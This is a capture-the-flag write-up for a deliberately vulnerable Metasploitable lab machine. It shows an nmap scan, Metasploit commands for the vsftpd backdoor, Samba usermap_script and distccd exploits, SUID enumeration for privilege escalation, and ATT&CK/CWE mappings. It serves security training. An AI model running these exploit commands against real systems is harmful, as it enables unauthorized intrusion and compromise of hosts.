# Maq101: Metasploitable

Writeup for the **Metasploitable** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 101

---

## Overview

A deliberately vulnerable Linux machine running multiple exploitable services. The goal is to identify and exploit one or more weak services to gain access and retrieve the flag.

## Reconnaissance

Full port scan reveals numerous open services.

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Common findings on Metasploitable targets: FTP (21), SSH (22), Telnet (23), SMTP (25), HTTP (80), Samba (139/445), MySQL (3306), PostgreSQL (5432), VNC (5900), IRC (6667), and distccd (3632).

## Exploitation

Multiple attack vectors exist. Common paths include:

**vsftpd 2.3.4 Backdoor:**

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [TARGET_IP]
run
```

**Samba usermap_script:**

```bash
use exploit/multi/samba/usermap_script
set RHOSTS [TARGET_IP]
run
```

**distccd RCE:**

```bash
use exploit/unix/misc/distcc_exec
set RHOSTS [TARGET_IP]
run
```

Any of these vectors can yield a shell. Enumerate the filesystem for flags once access is obtained.

## Privilege Escalation

From a low-privilege shell, check kernel version and SUID binaries:

```bash
uname -a
find / -perm -4000 -type f 2>/dev/null
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploitation of Remote Services | T1210 |
| Network Service Discovery | T1046 |
| Exploit Public-Facing Application | T1190 |

### CWE

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command
- **CWE-912:** Hidden Functionality (vsftpd backdoor)

---

A machine with a dozen unlocked doors teaches the same lesson a hundred ways: patch early, patch often, and never assume obscurity is a substitute for security.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
